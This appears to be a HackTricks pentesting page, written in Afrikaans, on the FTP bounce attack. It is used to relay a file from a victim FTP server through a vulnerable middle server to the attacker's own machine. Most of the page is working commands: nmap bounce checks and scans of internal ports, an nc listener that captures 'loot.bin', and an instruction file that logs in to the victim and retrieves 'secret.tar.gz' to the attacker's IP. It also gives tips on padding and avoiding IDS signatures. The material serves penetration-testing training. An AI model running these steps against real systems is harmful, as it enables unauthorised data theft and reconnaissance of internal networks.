# FTP Bounce Aflaai 2 van FTP-lêer

{{#include ../../banners/hacktricks-training.md}}


## Opsomming

As jy toegang het tot 'n **bounce FTP server**, kan jy dit laat versoek lêers van **'n ander FTP server** (waar jy van die inlogbesonderhede weet) en daardie lêer na **jou eie server** aflaai.

## Vereistes

- Geldige FTP-inlogbesonderhede op die **FTP Middle server**
- Geldige FTP-inlogbesonderhede op die **Victim FTP server**
- Beide servers **ondersteun die `PORT`-opdrag** (bounce FTP attack)
- Jy kan binne 'n gids op die **FTP Middle server** **skryf**
- Die middle server het **meer toegang** tot die Victim FTP Server as jy

## Stappe

1. Koppel aan **jou eie FTP server** en stel die verbinding op passief (`pasv` command) sodat dit in 'n gids **luister** waar die victim service die lêer sal stuur.
2. Skep die lêer wat die FTP Middle server na die Victim server sal stuur (die **exploit script**). Hierdie lêer sal gewone teks wees met die nodige opdragte om teen die Victim server te autentiseer, die gids te verander en 'n lêer na jou eie server af te laai.
3. Koppel aan die **FTP Middle Server** en laai die vorige lêer op.
4. Laat die FTP Middle server 'n verbinding **vestig** met die Victim server en stuur die exploit-lêer.
5. **Vang** die lêer op jou eie FTP server.
6. **Verwyder** die exploit-lêer van die FTP Middle server.

## Vinnige kontrole vir kwesbare bounce hosts

- **Nmap** ondersteun steeds FTP bounce-checks. Voorbeeld om 'n potensiële middle server te verifieer:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
As die bediener derdeparty `PORT`-waardes weier sal die scan misluk; sommige ingebedde of verouderde drukkers, NAS en appliance FTP-daemons laat dit steeds toe.

## Outomatiseer die 2de FTP-aflaai

Hieronder is 'n gemoderniseerde manier om 'n lêer deur 'n kwesbare middelste FTP-bediener te trek.

1. **Maak 'n passiewe luisteraar oop** op jou aanvalsboks (enige TCP sink werk):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Merk** jou IP as `A,B,C,D` en poort `P` as `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Bou die instruksielêer** wat die middelbediener aan die slagoffer sal herhaal:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Laai op & aktiveer vanaf die middelbediener** (klassieke proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Haal die lêer** van jou luisteraar (`loot.bin`).
6. **Verwyder** die opgelaaide `instrs`-lêer op die middelbediener.

Aantekeninge:
- Padding (`dd ...`) voorkom dat die kontrole-verbinding sluit voordat die RETR klaar is (groot TCP-vensterprobleem bespreek in klassieke writeups).
- Enige diens wat kan **luister en TCP dump** kan die FTP PASV-sok vervang (bv. `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- As die middelbediener bevoorregte poorte beperk, gebruik 'n hoë poort in `PORT` en pas jou luisteraar daarvolgens aan.

## Ekstra wenke

- Gebruik 'n bounceable FTP-bediener om interne hosts te poortskandeer wanneer lêerrelay geblokkeer is:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Sommige moderne WAF/IDS (bv. Juniper IPS) bevat signatures spesifiek vir **FTP:EXPLOIT:BOUNCE-ATTACK**; lawaaierige payloads of ontbrekende padding kan dit ontlok.
- Wanneer die middelbediener "PORT to same host"-beperkings afdwing, plaas jou **luisteraar op die middelbediener self** (as jy skryf/uitvoer toegangsregte het) en stuur die gekapte lêer later deur.

Vir 'n meer gedetailleerde old-school deurloop, kyk: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
